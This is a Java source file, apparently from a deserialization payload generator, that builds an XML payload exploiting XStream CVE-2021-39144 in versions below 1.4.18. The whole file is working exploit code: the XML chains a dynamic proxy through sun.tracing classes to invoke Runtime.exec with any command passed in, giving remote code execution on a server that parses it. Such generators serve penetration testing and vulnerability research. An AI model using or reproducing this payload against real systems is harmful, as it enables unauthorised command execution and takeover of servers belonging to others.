package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.payloads.CommandObjectPayload;

// Xstream CVE-2021-39144

@Dependencies({"com.thoughtworks.xstream:Xstream:<1.4.18"})
public class XStream39144 implements CommandObjectPayload<Object>
{

    @Override
    public Object getObject(String command) throws Exception {

        String xml ="<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <dynamic-proxy>\n" +
                "      <interface>java.lang.Comparable</interface>\n" +
                "      <handler class='sun.tracing.NullProvider'>\n" +
                "        <active>true</active>\n" +
                "        <providerType>java.lang.Comparable</providerType>\n" +
                "        <probes>\n" +
                "          <entry>\n" +
                "            <method>\n" +
                "              <class>java.lang.Comparable</class>\n" +
                "              <name>compareTo</name>\n" +
                "              <parameter-types>\n" +
                "                <class>java.lang.Object</class>\n" +
                "              </parameter-types>\n" +
                "            </method>\n" +
                "            <sun.tracing.dtrace.DTraceProbe>\n" +
                "              <proxy class='java.lang.Runtime'/>\n" +
                "              <implementing__method>\n" +
                "                <class>java.lang.Runtime</class>\n" +
                "                <name>exec</name>\n" +
                "                <parameter-types>\n" +
                "                  <class>java.lang.String</class>\n" +
                "                </parameter-types>\n" +
                "              </implementing__method>\n" +
                "            </sun.tracing.dtrace.DTraceProbe>\n" +
                "          </entry>\n" +
                "        </probes>\n" +
                "      </handler>\n" +
                "    </dynamic-proxy>\n" +
                "    <string>"+command+"</string>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";

        return xml;
    }
}